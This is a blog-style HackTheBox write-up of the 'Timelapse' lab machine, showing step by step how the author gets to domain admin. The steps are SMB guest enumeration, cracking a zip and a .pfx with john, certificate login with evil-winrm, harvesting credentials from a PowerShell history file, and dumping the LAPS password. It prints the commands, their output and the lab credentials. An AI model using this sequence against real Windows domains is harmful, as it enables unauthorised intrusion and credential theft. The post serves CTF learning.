---
layout: post
title: Timelaps writeup.
subtitle: From HackTheBox CTF platform.
cover-img: /assets/img/Timelapse.png
thumbnail-img: /assets/img/Timelapse.png
share-img: /assets/img/Timelapse.jpg
tags: [hackthebox, ctf, windows]
---


# About the machine: 

Timelaps is an easy machine and I can totally confirm that it's beginner friendly. It will teach you how to crack zip files as well as how to deal with cerifcation. Also, for beginners who want to learn Windows previlige escalation, this machine provides you with a nice example to do so. I hope you enjoy my first HackTheBox writeup. 


## Nmap

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 11:46 +01
Nmap scan report for c
Host is up (0.13s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-09 18:48:22Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h01m34s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-08-09T18:48:31
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.42 seconds

```

# Enumerating SMB

Port 445 is worth the watch. I checked smb and it seems like it allows guest login.

with crackmapesec: 

```bash
└─$ crackmapexec smb 10.10.11.152 -u '%Guest' --shares -p ''
SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\%Guest: 
SMB         10.10.11.152    445    DC01             [+] Enumerated shares
SMB         10.10.11.152    445    DC01             Share           Permissions     Remark
SMB         10.10.11.152    445    DC01             -----           -----------     ------
SMB         10.10.11.152    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.152    445    DC01             C$                              Default share
SMB         10.10.11.152    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.152    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.11.152    445    DC01             Shares          READ            
SMB         10.10.11.152    445    DC01             SYSVOL                          Logon server share 
```

with smbclient:

```bash
└─$ smbclient -L 10.10.11.152
Password for [WORKGROUP\user]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We have permession on the Shares folder. Let's dive in and see what we can find. 

```bash
└─$ smbclient //10.10.11.152/Shares 
Password for [WORKGROUP\user]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 16:39:15 2021
  ..                                  D        0  Mon Oct 25 16:39:15 2021
  Dev                                 D        0  Mon Oct 25 20:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 16:48:42 2021

                6367231 blocks of size 4096. 2467987 blocks available
smb: \> cd Dev\
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 20:40:06 2021
  ..                                  D        0  Mon Oct 25 20:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 16:46:42 2021

                6367231 blocks of size 4096. 2467987 blocks available
smb: \Dev\> get winrm_backup.zip 
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (5.0 KiloBytes/sec) (average 5.0 KiloBytes/sec)
```
I found a backup file in Dev directory and I downloaded immedialty. It's obvious but it's password protected. Let's crack it. first we use `zip2john` to processe the input ZIP file into a format suitable for use with John The Ripper. 

# Let's do some password cracking

```bash
└─$ zip2john winrm_backup.zip > hashzip
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
```

`john --wordlist=~/Downloads/rockyou.txt hashzip`

```bash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2022-08-09 11:58) 1.428g/s 4962Kp/s 4962Kc/s 4962KC/s surkerior..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                  
```

Found password: `supremelegacy`. After unzipping it, I found an pfx file. 

The . pfx file, which is in a PKCS#12 format usually contains the SSL certificate (public keys) and the corresponding private keys. We need to extract the certificate and the key from it. For that we need the password. Luckly, we can crack it using John after proccessing it using pfx2john.  

```bash
pfx2john legacyy_dev_auth.pfx > hashpfx
```

Let's use John again. 

```bash
└─$ john --wordlist=~/Downloads/rockyou.txt hashpfx 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:58 DONE (2022-08-09 12:06) 0.01699g/s 54914p/s 54914c/s 54914C/s thuglife03282006..thscndsp1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

And we got the password which is `thuglegacy`.

# Extracting the certificate and keys from a .pfx file

So what we are doing here is we are trying to import the certificate and private keys separately in an unencrypted plain text format to use it on another system. 

I cheked my notes about openssl and found this [stackoverflow](https://stackoverflow.com/questions/16397858/how-to-extract-private-key-from-pfx-file-using-openssl) wich helped me complete this operation. 

```bash
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
```
-nocerts: Don't output certificates

We have a key. Now let's extract the certification.

```bash
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out crt
Enter Import Password:
```
-in Input filename
-clcerts Only output client certificates
-out outfile Output filename

Now let's use the certificate and the key to connect with evil-winrm. My friend didn't know about evil-winrm. So if you are like him Evil-winrm is tool to connect to remote hosts using WinRM (Windows Remote Management). it's installed by default in kali. Check out more [here](https://github.com/Hackplayers/evil-winrm)

`evil-winrm -S -i 10.10.11.152 -c crt -k key`

We use -S because we are trying to connect from a secure port and we need to enable SSL 

```bash
Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\legacyy\Documents> type ../Desktop/user.txt
Enter PEM pass phrase:
1**********************8c

```

First thing we do after landing on a windows machine is to run Winpeas (Winpeas).

You can find winpeas at: [Winpeas](https://github.com/carlospolop/PEASS-ng/releases/tag/20220814 )

After browsing the output for a while. I found a history file which has a password and login.  

```bash
*Evil-WinRM* PS C:\Users\legacyy\Documents>  type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt
Enter PEM pass phrase:
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit

```
Remember, in HackTheBox, Every machine's name indicate a hint about something related to that machine. In our case it's a tool called laps. So it's definiley has something to do with LAPSDumper. Here's the [tool] (https://github.com/n00py/LAPSDumper)

LAPSDumper is python script to dumps temporary admin password which we will use to login as Administrator.   

```bash
└─$ python3 laps.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb
LAPS Dumper - Running at 08-16-2022 12:18:37
DC01 ,B]0+G#3{+5CDD2t+O,Aj(Q4
```

```bash
└─$ evil-winrm -i 10.10.11.152 -u Administrator -p ',B]0+G#3{+5CDD2t+O,Aj(Q4' -S

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

That was it. See you next writeup.